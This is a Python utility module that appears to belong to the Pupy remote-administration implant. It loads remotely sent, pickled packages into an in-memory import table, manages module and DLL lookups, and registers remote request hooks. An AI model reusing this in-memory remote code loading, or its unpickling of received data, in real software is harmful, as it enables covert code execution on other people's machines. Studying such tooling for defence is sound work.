# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

__all__ = (
    'pupy_add_package', 'has_module', 'has_dll', 'new_modules',
    'new_dlls', 'invalidate_module',
    'register_package_request_hook', 'register_package_error_hook',
    'unregister_package_error_hook', 'unregister_package_request_hook',
    'safe_obtain', 'register_pupyimporter'
)

import sys
import imp
import zlib
import gc

import umsgpack

if sys.version_info.major > 2:
    import pickle
else:
    import cPickle as pickle

import pupy

logger = pupy.get_logger('utils')


def pupy_add_package(pkdic, compressed=False, name=None):
    ''' Update the modules dictionary to allow
        remote imports of new packages
    '''

    if __debug__:
        logger.debug(
            'Add package (size=%d compressed=%s name=%s)',
            len(pkdic), compressed, name)

    if compressed:
        pkdic = zlib.decompress(pkdic)

    module = pickle.loads(pkdic)

    if __debug__:
        logger.debug('Add files: %s', tuple(module))

    pupy.modules.update(module)


def has_module(name):
    try:
        if (
            name in sys.modules or name in sys.builtin_module_names or
                name in pupy.modules):
            return True

        fsname = name.replace('.', '/')
        fsnames = (
            '{}.py'.format(fsname),
            '{}/__init__.py'.format(fsname),
            '{}.pyd'.format(fsname),
            '{}.so'.format(fsname)
        )

        for module in pupy.modules:
            if module.startswith(fsnames):
                return True

        if not pupy.is_native():
            try:
                imp.find_module(name)
                return True

            except ImportError:
                pass

        return False

    except Exception as e:
        pupy.dprint(
            'has_module Exception: {}/{} (type(name) == {})',
            type(e), e, type(name)
        )


def has_dll(name):
    return name in pupy.dlls


def new_modules(names):
    pupy.dprint('new_modules call: {}/{}', type(names), len(names))

    try:
        return [
            name for name in names if not has_module(name)
        ]

    except Exception as e:
        pupy.dprint(
            'new_modules Exception: {}/{} (type(names) == {})',
            type(e), e, type(names)
        )

        return names


def new_dlls(names):
    return tuple(
        name for name in names if not has_dll(name)
    )


def invalidate_module(name):
    for item in list(pupy.modules):
        if item.startswith((name+'/', name+'.')):
            pupy.dprint('Remove {} from pupyimporter.modules'.format(item))
            del pupy.modules[item]

    for item in list(sys.modules):
        # It's a mess..
        if item.startswith(('pywintypes', 'pythoncom')):
            continue

        if not (item == name or item.startswith(name+'.')):
            continue

        del sys.modules[item]

        if pupy.namespace:
            pupy.dprint('Remove {} from rpyc namespace'.format(item))
            pupy.namespace.__invalidate__(item)

    gc.collect()


def register_package_request_hook(hook):
    pupy.remote_load_package = hook


def register_package_error_hook(hook):
    # Must be importer at low level, because
    # may not be possible to load network.* at early phase
    from network.lib.rpc import nowait
    pupy.remote_print_error = nowait(hook)


def unregister_package_error_hook():
    pupy.remote_print_error = None


def unregister_package_request_hook():
    pupy.remote_load_package = None


def safe_obtain(proxy):
    # Safe version of rpyc's rpyc.utils.classic.obtain,
    # without using pickle.

    if type(proxy) in [list, str, bytes, dict, set, type(None)]:
        return proxy

    try:
        conn = object.__getattribute__(proxy, '____conn__')()
    except AttributeError:
        return proxy

    if not hasattr(conn, 'obtain'):
        setattr(conn, 'obtain', conn.root.msgpack_dumps)

    return umsgpack.loads(
        zlib.decompress(
            conn.obtain(proxy, compressed=True)
        )
    )


# RPC API for fake pupyimporter module

def register_pupyimporter():
    pupyimporter = pupy.make_module('pupyimporter')

    PUPYIMPORTER_API_UTILS = (
        pupy_add_package, has_module, has_dll, new_modules,
        new_dlls, invalidate_module,
        register_package_request_hook, register_package_error_hook,
        unregister_package_error_hook, unregister_package_request_hook
    )

    for export in PUPYIMPORTER_API_UTILS:
        setattr(pupyimporter, export.__name__, export)

    setattr(pupyimporter, 'load_dll', pupy.load_dll)
    setattr(pupyimporter, 'modules', pupy.modules)

    return pupyimporter
